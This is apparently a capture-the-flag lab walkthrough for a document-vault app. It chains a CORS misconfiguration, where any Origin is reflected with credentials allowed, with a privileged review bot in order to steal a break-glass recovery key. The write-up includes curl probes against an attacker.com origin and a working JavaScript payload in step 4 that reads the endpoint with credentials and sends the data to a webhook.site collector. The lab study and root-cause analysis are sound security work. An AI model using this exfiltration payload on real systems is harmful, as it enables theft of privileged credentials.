# vaultly-010 - BugForge Lab Walkthrough

**URL:** https://lab-1785738284743-r8reu0.labs-app.bugforge.io
**Difficulty:** Medium
**Vulnerability:** CORS misconfiguration (unrestricted Origin reflection + `Access-Control-Allow-Credentials: true`) on an internal "HQ ops" endpoint, weaponized via the app's own review-bot feature (attacker-controlled content reviewed by a privileged headless-browser bot)
**Flag:** `bug{KnWKDTmSdpScTOUQ0Kr44Uo5TjCfG7QK}`

---

## Summary

Vaultly is a multi-tenant document-vault SaaS (Next.js App Router). It ships a
"Sandbox" feature under Settings that lets members publish a small HTML/JS
preview app and request a review from a "Vaultly HQ operator" - an internal
headless-Chrome bot that opens the submitted URL. The internal `GET
/api/hq/recovery` endpoint (which returns the org's break-glass admin
recovery key) reflects whatever `Origin` header is sent, verbatim, together
with `Access-Control-Allow-Credentials: true` - no origin allowlist is
actually enforced despite an internal spec doc claiming the API "echoes
approved Sandbox origins". Because none of the four seeded accounts holds the
privileged HQ-operator session, the bug alone isn't enough - it has to be
chained with the review-bot: publish a malicious preview app that does a
credentialed cross-origin `fetch()` to `/api/hq/recovery` and exfiltrates the
JSON body to an attacker-controlled collector, then request a review so the
bot (running its own authenticated session) opens the page and triggers the
theft.

## Tech Stack

- Next.js (App Router), RSC
- Cookie session auth for the main web app (`vaultly_session`, HttpOnly, `SameSite=Lax`) - login endpoint only accepts `application/x-www-form-urlencoded` bodies (a JSON body returns a bare `500`)
- Separate Bearer-token REST surface under `/api/v1/*` (personal API tokens created via `POST /api/tokens`, prefix `vat_`, scoped `profile` / `files:read` / `files:write`)
- "Vaultly Sandbox" preview-app publish/review feature, backed by a real internal headless Chrome instance (confirmed via captured `User-Agent: ... HeadlessChrome/149.0.0.0` and `Referer/Origin: http://localhost:3001/` on its outbound requests) - the "sandbox content origin" (`apps.vaultly-sandbox.dev`) and "API domain" (`api.vaultly.app`) named in the UI copy are flavor text; everything is served/simulated within the single lab deployment
- Seeded demo accounts: `owner@acme.test` / `admin@acme.test` / `editor@acme.test` / `viewer@acme.test`, password `vaultly` for all (same pattern as vaultly-006)

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/auth/login` | none | form-urlencoded only; JSON body → 500 |
| `POST /api/tokens` | session cookie | creates a personal API token, returned once via `Location` redirect query string |
| `GET /api/v1/me`, `GET /api/v1/files` | Bearer token | no CORS headers set at all |
| `GET /api/files/:id` | session cookie | raw file content, used to read internal spec docs |
| `POST /api/sandbox/apps` `{html}` | session cookie | publishes preview HTML/JS, returns `{id,url}` |
| `POST /api/support/review` `{url}` | session cookie | queues the URL for the HQ-operator bot to open |
| `GET /api/sandbox/hits` | session cookie | beacon log for the published app (not needed - used an external collector instead) |
| `GET /api/hq/recovery` | HQ-operator session, admin scope | **vulnerable endpoint** - returns the break-glass recovery key JSON; reflects any `Origin` with `Access-Control-Allow-Credentials: true` |

## Attack Chain

1. **Login** with seeded creds (form-urlencoded, not JSON):
```
curl -s -X POST "$TARGET/api/auth/login" -H "Content-Type: application/x-www-form-urlencoded" \
  --data "email=owner@acme.test&password=vaultly" -c owner_cookies.txt
```

2. **Source/spec audit** - `/settings/sandbox` describes the preview-app + HQ-review workflow and shows a sample widget doing `fetch('https://api.vaultly.app/api/v1/me', {credentials:'include'})`. The Product vault contains an internal doc, `sandbox-apps-spec.md` (file id 12), readable via the session-cookie file API:
```
curl -s -b owner_cookies.txt "$TARGET/api/files/12"
```
It states outright:
> Sandbox apps call the Vaultly API at https://api.vaultly.app with the member session (credentialed requests) - the API echoes approved Sandbox origins so a widget can read its own account data cross-origin.
> HQ ops automation reads the break-glass recovery key from the ops console via `GET /api/hq/recovery` (HQ operator session, admin scope).

This names the exact target endpoint and the exact (broken) trust assumption.

3. **Confirm the CORS bug directly** - hit `/api/hq/recovery` with a valid-but-unprivileged session cookie and vary `Origin`:
```
curl -s -i -b owner_cookies.txt -H "Origin: https://attacker.com" "$TARGET/api/hq/recovery"
# HTTP/2 403
# access-control-allow-credentials: true
# access-control-allow-origin: https://attacker.com
```
Every origin tried - `https://attacker.com`, `null`, `https://evilapps.vaultly-sandbox.dev`, `https://apps.vaultly-sandbox.dev.attacker.com` - was reflected verbatim with credentials allowed. There is no allowlist at all, despite the spec doc's claim. (Body is `403 forbidden` here because none of the four seeded roles is the HQ operator - confirmed by testing owner/admin/editor/viewer, all 403.)

4. **Weaponize the review-bot** since we don't hold the privileged session ourselves. Publish a preview app whose JS does the credentialed cross-origin fetch and exfiltrates the result:
```html
<script>
fetch('https://api.vaultly.app/api/hq/recovery', { credentials: 'include' })
  .then(r => r.text())
  .then(d => fetch('https://webhook.site/<my-uuid>?data=' + encodeURIComponent(d)));
</script>
```
```
curl -s -b owner_cookies.txt -X POST "$TARGET/api/sandbox/apps" -H "Content-Type: application/json" \
  -d '{"html":"<script>...</script>"}'
# {"id":"0c0164c98dc518d7","url":"https://apps.vaultly-sandbox.dev/s/0c0164c98dc518d7"}
```

5. **Request an HQ review** for that URL:
```
curl -s -b owner_cookies.txt -X POST "$TARGET/api/support/review" -H "Content-Type: application/json" \
  -d '{"url":"https://apps.vaultly-sandbox.dev/s/0c0164c98dc518d7"}'
```

6. Within seconds, the internal HQ-operator headless Chrome instance opens the preview under its own authenticated (admin-scope) session. The CORS misconfiguration lets the page's JS actually *read* the cross-origin response, and it beacons the result out:
```json
{"org":"Vaultly HQ","record":"break-glass","recovery_key":"bug{KnWKDTmSdpScTOUQ0Kr44Uo5TjCfG7QK}","note":"Emergency access key. Rotate after use."}
```
Captured on the webhook.site collector, with the bot's own `User-Agent: ...HeadlessChrome/149.0.0.0` and `Referer: http://localhost:3001/` visible in the request.

7. Flag submitted via BugForge's `POST /api/labs/submit-flag` (existing authenticated Playwright storage-state session) → `{"correct":true,"pointsAwarded":50,...}`.

## Discovery Notes

Standard Phase 2 source/spec audit (reading a vault file the app itself makes
readable to any member) handed over the entire vulnerable design in plain
English - no fuzzing or guessing of the `/api/hq/recovery` path name was
needed. The tell that this was the intended path: the spec explicitly
describes a credentialed cross-origin trust relationship ("the API echoes
approved Sandbox origins") for a feature whose entire purpose is to let a
privileged bot open user-controlled content - a combination that is CORS
attack surface by construction, not just in theory.

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| `POST /api/auth/login` with JSON body | `500` (empty body) | This app's auth route only accepts `application/x-www-form-urlencoded`; JSON is not just rejected, it 500s. Always fall back to form-encoding on a bare 500 with no error body. |
| Resolving/curling `apps.vaultly-sandbox.dev` and `api.vaultly.app` directly, incl. `Host:` header override against the lab's own IP | NXDOMAIN / generic Vercel-style `404 page not found` plaintext | Those domain names are UI flavor text for a fully server-simulated feature; don't waste time trying to reach them yourself - the bot's own request headers (`Referer: http://localhost:3001/`) are the real signal of where things actually run. |
| CORS headers on `/api/v1/me`, `/api/v1/files` (Bearer-token API) with varied `Origin` | No `Access-Control-*` headers at all, any origin | The CORS bug is specific to the HQ-ops surface, not a blanket app-wide misconfiguration - don't assume a finding on one API family generalizes to a sibling one without testing it directly. |
| Looking for an `/admin`, `/hq`, `/ops`, `/console` page (vaultly-006 pattern) | All `404` | This instance has no middleware-gated admin console at all; the vaultly-006 CVE-2025-29927 bypass and the vaultly-004 prototype-pollution bug do not reproduce here - confirms per-instance bug rotation even within the same app family. |
| Direct `/api/hq/recovery` call with the four seeded accounts' own sessions | `403 forbidden` (but CORS headers present) | None of owner/admin/editor/viewer is the "HQ operator" - the endpoint's authorization is intact, only its CORS layer is broken. The bug is only reachable by riding a privileged session you don't own, i.e. via the review-bot. |

## Root Causes

- **No origin allowlist implemented despite one being claimed in the design.** The internal spec says the API "echoes *approved* Sandbox origins," but the actual CORS middleware on `/api/hq/recovery` reflects any `Origin` header unconditionally and pairs it with `Access-Control-Allow-Credentials: true` - the single most dangerous CORS misconfiguration shape (full read access to authenticated responses from any origin).
- **A privileged, content-visiting bot is exposed to arbitrary user-submitted HTML/JS with no isolation from the sensitive API surface it can reach.** Even a correctly-scoped CORS allowlist limited to the real sandbox origin would still be exploitable here, since attacker-controlled JS is *itself* served from (or reachable as) that trusted origin by design - the review workflow's entire premise (bot opens untrusted content under a privileged session) needed either a same-origin-only sensitive API or no ambient credentials during preview review, and had neither.
- **Sensitive break-glass/recovery material is reachable over a general HTTP JSON API at all**, rather than requiring a fresh step-up/re-auth action - a stolen CORS-readable session is enough to fully retrieve it.

## CWE / OWASP

- CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- CWE-346: Origin Validation Error
- OWASP A05:2021 - Security Misconfiguration
- OWASP A01:2021 - Broken Access Control (secondary: the review-bot's ambient-credential exposure to attacker content)
